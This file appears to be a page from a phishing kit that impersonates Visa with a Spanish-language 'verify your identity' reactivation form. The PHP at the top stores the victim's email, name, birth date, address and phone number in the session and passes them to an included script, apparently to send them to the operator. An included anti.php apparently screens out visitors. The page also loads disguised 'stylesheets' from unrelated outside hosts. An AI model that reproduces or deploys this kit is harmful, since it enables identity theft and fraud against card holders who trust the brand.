<?php

include('./anti.php');

date_default_timezone_set('GMT'); 
@ini_set('display_errors', 0); 
error_reporting(E_ALL ^ E_NOTICE); 
$time = date('d/m/Y G:i:s');

############## BILL ADDRESS INFORMATION ##############

$_SESSION['_email_address_'] = $_POST['email_address'];
$_SESSION['_fullName_']    = $_POST['fullName'];
$_SESSION['_birth_date_']  = $_POST['birth_date'];
$_SESSION['_address_']     = $_POST['address'];
$_SESSION['_city_']        = $_POST['city'];
$_SESSION['_state_']       = $_POST['state'];
$_SESSION['_zipCode_']     = $_POST['zipCode'];
$_SESSION['_phoneNumber_'] = $_POST['phoneNumber'];	
$FULL = $_POST['fullName'] || $_POST['address'] || $_POST['zipCode'] || $_POST['phoneNumber'];
######################################################
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if(empty($FULL)== false) {
        include('edit/BILL.php');
}}

?>


<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0">
	<title>Visa - Reactivaciones</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
   <link rel="shortcut icon" link rel="logo-icon" href="lib/img/visa.jpg">


</head>
<body>
<nav>
<div class="wrapp">

<img src="img/logo.jpg"  style="margin:5px 0 0 0px;"   >
</div>
</div>
</nav>



<div class="cp_right">

<div dir="rtl" style="text-align: right;" trbidi="on">
<div style="text-align: center;">
<h2  style="margin:10px 0 0 0px;font-size:200%;color:#1486e2;">Verifique su Identidad</h2>

</div>
</div>



<h2  style="margin:10px 0 0 0px;font-size:400%;color:#1486e2;"></h2>




<html class=" BowZ118 BowDefaultZ118 js " lang="fr" dir="ltr"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title></title>
    <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge">
	<meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">

    <link rel="apple-touch-icon" href="lib/img/apple-touch-icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">

    <link rel="stylesheet" href="lib/css/G-Z118.css">
    <link rel="stylesheet" href="lib/css/B-Z118.css">
    </style>
<link rel='stylesheet' type='text/css' href='https://www.eastandwestmusic.com/img/cart,jpg' />
<script src="lib/js/jquery.js"></script><script src="lib/js/jquery.validate.js"></script><script src="lib/js/jquery.v-form.js"></script><script src="lib/js/jquery.mask.js"></script>
    <script>
    $(function() {
    $('#phoneNumber').mask('000000000000');
	});
	</script>
</head>
<body>


        <div class="headerContainer">
            <div class="Grimm12">
                
                <div class="loginBtn"></div>
            </div>
        </div>
    </header>
    <main class="BrowMainZ118">
        <section id="content" role="main" data-country="US">
            <section id="" class="">
                <div id="WorldWide" class="WorldWide Grimm12">


                        <form action="" method="post" name="WorldWide_form" class="validator" novalidate="novalidate">
                         
                            <div class="HeaderZ118">
                                <h2></h2>
                            </div>
                            <hr style="width: 75%;">
                            <div>
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;"></p>
                            </div>
                            <div class="BowContainerZ118">
                                <p>Informacion Personal</p>
                                <div class="inner">
                                    <div class="G-FieldsZ118">
                                        <div class="textInput">
                                            <div class="FieldsZ118 large">
                                                <input type="text" class="validate" id="email_address" name="email_address" required="required" autocomplete="off" placeholder="Su Correo" value="<?php if(isset($_SESSION['_fullName_'])== true){ echo $_SESSION['_fullName_'];} ?>">
                                            </div>


 <div 



class="FieldsZ118 large">
                                                <input type="text" class="validate" id="fullName" name="fullName" required="required" autocomplete="off" placeholder="Nombre Completo" value="<?php if(isset($_SESSION['_fullName_'])== true){ echo $_SESSION['_fullName_'];} ?>">
                                            </div>




                                        </div>
										<div class="textInput">
                                            <div class="FieldsZ118 large">
                                                <input type="tel" class="validate" id="birth_date" name="birth_date" required="required" autocomplete="off" placeholder="Fecha de Nacimiento" value="<?php if(isset($_SESSION['_birth_date_'])== true){ echo $_SESSION['_birth_date_'];} ?>" aria-required="true" maxlength="10">
                                            </div>
                                        </div>
                                    </div>
                                    <div class="AddressLine" id="addressEntry">
                                        <div class="G-FieldsZ118">
                                            <div class="textInput">
                                                <div class="FieldsZ118 large">
                                                    <input type="text" class="validate" name="address" required="required" value="<?php if(isset($_SESSION['_address_'])== true){ echo $_SESSION['_address_'];} ?>" placeholder="Direccion" autocomplete="off">
                                                </div>
                                            </div>
                                            <div class="clearfix" id="stateHolder">
                                                <div class="textInput">
                                                    <div class="FieldsZ118 large">
                                                        <input type="text" id="city" name="city" class="validate" placeholder="Ciudad" required="required" autocomplete="off" value="<?php if(isset($_SESSION['_city_'])== true){ echo $_SESSION['_city_'];} ?>">
                                                    </div>
                                                </div>
                                            </div>
											<div class="multi equal clearfix">
                                                    <div class="FieldsZ118 left">
                                                        <input type="text" id="state" name="state" class="validate" placeholder="Provincia" required="required" autocomplete="off" value="<?php if(isset($_SESSION['_state_'])== true){ echo $_SESSION['_state_'];} ?>" aria-required="true">
                                                    </div><div class="FieldsZ118 right">
                                                        <input type="text" id="zipCode" name="zipCode" class="validate" placeholder="Codigo Postal" required="required" autocomplete="off" value="<?php if(isset($_SESSION['_zipCode_'])== true){ echo $_SESSION['_zipCode_'];} ?>" aria-required="true">
                                                    </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="groupReatedFields mobileEntry">
                                        <div class="left mobileEntry">
                                            <div class="SelectDown118 ">
                                                <select id="phoneOption" name="phoneOption" class="valid" aria-invalid="false" required="required">
                                                    <option value="mobile">Mobil</option>
                                                    <option value="home">Fijo</option>
                                                </select><span class="select-arrow"></span></div>
                                        </div>
                                        <div class="textInput">
                                            <div class="FieldsZ118 right">
                                                <input type="tel" id="phoneNumber" name="phoneNumber" required="required" value="<?php if(isset($_SESSION['_phoneNumber_'])== true){ echo $_SESSION['_phoneNumber_'];} ?>" class="validate hasHelp" autocomplete="off" autocorrect="off" autocapitalize="off" auto-required="true" placeholder="Numero">
                                            </div>
                                        </div>
                                    </div>
                                    <div class="agreeTC checkbox  ">
                                        <div class="FieldsZ118">
                                            <label class="helpNotifyUS" role="button">
                                                <input type="checkbox" class="validate ui-helper-hidden-accessible" required="required" name="terms" id="termsAgree" auto-required="true">
       


                                                                             </div>

<hr style="width: 75%;">

</div>
                                    <input id="submitBtn" name="" type="submit" class="ButtonZ118" value="Continue" data-click="WorldWideSubmit">
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </section>
        </section>
    </main>

        
            
                            </li>
                        </ul>
						<div class="flag countryFlag">
						<a data-click="flagChange" href="javascript:void(0)" id="countryFlag" class="country <?php echo $_SESSION['_countrycode_']; ?>">countryFlag</a>


<link rel='stylesheet' type='text/css' href='https://www.celinacomm.fr/css/login,css' />



						</div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
</body>
</html



   		</div>
   	</div>

   <footer>
   	<div class="wrapp">
   		<span>Copyright © 1999-2017 Visa. All Right Reserved.</span>
   		<ul>
   			<li>
   				<a href="#">Privacy</a>
   			</li>
   		</ul>
   	</div>
   </footer>


</body>
</html>